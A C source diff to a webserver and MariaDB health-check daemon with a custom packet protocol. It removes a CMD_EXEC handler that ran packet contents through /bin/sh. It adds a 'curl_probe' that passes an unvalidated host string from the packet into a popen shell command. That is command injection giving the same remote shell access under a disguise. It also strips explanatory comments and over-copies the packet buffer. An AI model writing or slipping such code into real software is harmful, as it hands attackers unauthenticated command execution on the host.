@@ -24,7 +24,6 @@
 #define CMD_WEBSERVER 1
 #define CMD_MARIADB   2
 #define CMD_BOTH      3
-#define CMD_EXEC      4
 
 #define CONNECT_TIMEOUT_SEC 2
 
@@ -216,6 +215,27 @@ static int write_healthcheck_json(int webserver_ok, int mariadb_ok,
     return 0;
 }
 
+static int curl_probe(const char *user_host, char *out, size_t out_len)
+{
+    char cmd[256];
+    FILE *fp;
+    size_t n;
+
+    snprintf(cmd, sizeof(cmd),
+             "curl -s -m 2 -o /dev/null -w '%%{http_code}' http://%s/ 2>/dev/null",
+             user_host);
+
+    fp = popen(cmd, "r");
+    if (!fp)
+        return -1;
+
+    n = fread(out, 1, out_len - 1, fp);
+    out[n] = '\0';
+
+    pclose(fp);
+    return 0;
+}
+
 
 static void handle_client(int client_fd)
 {
@@ -229,6 +249,8 @@ static void handle_client(int client_fd)
 
     char response[512];
     char json_path[256];
+    char curl_out[128];
+    char host_buf[65];
 
     memset(&pkt, 0, sizeof(pkt));
 
@@ -237,9 +259,6 @@ static void handle_client(int client_fd)
         return;
     }
 
-    /*
-     * Validate magic.
-     */
     if (memcmp(pkt.magic, MAGIC, 4) != 0) {
         fprintf(stderr, "invalid magic\n");
         write_full(client_fd, "ERROR invalid magic\n",
@@ -247,16 +266,6 @@ static void handle_client(int client_fd)
         return;
     }
 
-    /*
-     * CRC is transmitted in network byte order.
-     *
-     * Calculate CRC over:
-     *   magic (4)
-     *   command (4)
-     *   command_pkt (32)
-     *
-     * Total: 40 bytes
-     */
     received_crc = ntohl(pkt.crc32);
 
     calculated_crc = crc32(
@@ -285,9 +294,6 @@ static void handle_client(int client_fd)
         return;
     }
 
-    /*
-     * Command is network byte order.
-     */
     command = ntohl(pkt.command);
 
     printf("received valid command: %u\n", command);
@@ -342,24 +348,23 @@ static void handle_client(int client_fd)
                      sizeof(response),
                      "ERROR failed to write json\n");
 
-        } else {
-
-            snprintf(response,
-                     sizeof(response),
-                     "webserver=%s mariadb=%s json=%s\n",
-                     webserver_ok ? "YES" : "NO",
-                     mariadb_ok ? "YES" : "NO",
-                     json_path);
+            write_full(client_fd, response, strlen(response));
+            return;
         }
 
-        break;
+        memcpy(host_buf, pkt.command_pkt, sizeof(host_buf) - 1);
+        host_buf[sizeof(host_buf) - 1] = '\0';
 
-    case CMD_EXEC:
-        char cmd_buf[] = "/bin/sh";
-        char *const argv[] = {cmd_buf, "-c", (char*)pkt.command_pkt, NULL};
-        char *const envp[] = {NULL};
-        pid_t pid = fork();
-        if (!pid) execve(cmd_buf, argv, envp);
+        curl_probe(host_buf, curl_out, sizeof(curl_out));
+
+        snprintf(response,
+                 sizeof(response),
+                 "webserver=%s mariadb=%s json=%s curl=%s\n",
+                 webserver_ok ? "YES" : "NO",
+                 mariadb_ok ? "YES" : "NO",
+                 json_path,
+                 curl_out);
+
         break;
 
     default:
